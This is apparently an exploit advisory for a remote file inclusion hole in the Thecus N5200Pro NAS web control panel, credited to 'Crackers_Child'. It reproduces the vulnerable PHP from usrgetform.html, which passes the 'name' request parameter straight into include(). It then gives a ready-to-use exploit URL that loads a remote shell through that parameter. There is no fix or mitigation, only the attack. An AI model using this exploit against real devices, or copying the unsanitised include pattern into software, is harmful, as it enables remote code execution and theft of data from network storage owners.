Thecus N5200Pro NAS Server Control Panel RFI Vulnerability
==========================================================

Thecus N5200Pro NAS Server Control Panel Remote File Include


Author : Crackers_Child

Mail   : cashr00t@hotmail.com

Bug in : usrgetform.html


<?php
    $htm=$_REQUEST[&#039;name&#039;];
    require_once("/img/htdocs/webconfig");
    require_once("/img/www/inc/function.php");
    get_sysconf();
    $version=trim(shell_exec("/bin/cat /img/version"));
    $model=trim(shell_exec(&#039;/bin/cat /proc/thecus_io | awk -F: \&#039;/CPUFLAG/{printf("%s", $2)}\&#039;&#039;));
    if($model=="1"){
      $model_name=$webconfig[&#039;product_no&#039;].$webconfig[&#039;pro&#039;];
    }else{
      $model_name=$webconfig[&#039;product_no&#039;];
    }
    if (!$htm){
        print &#039;no name given&#039;;
        exit;
    }
    if ($htm==&#039;lang&#039;) $htm=&#039;../pub/lang&#039;;
    session_start();
    header(&#039;Content-type: text/html;charset=utf-8&#039;);
    $lang=&#039;en&#039;;
    if (isset($_SESSION[&#039;lang&#039;])){$lang=$_SESSION[&#039;lang&#039;];};
    ob_start();
    include("$htm.htm");
    $html=ob_get_contents();
    ob_end_clean();

    include_once(&#039;header.html&#039;);
?>



Exploit : www.site.com:9443/usr/usrgetform.html?name=Shelz?

Info : http://www.thecus.com/products_over.php?cid=11&pid=8

Greetz: Str0ke


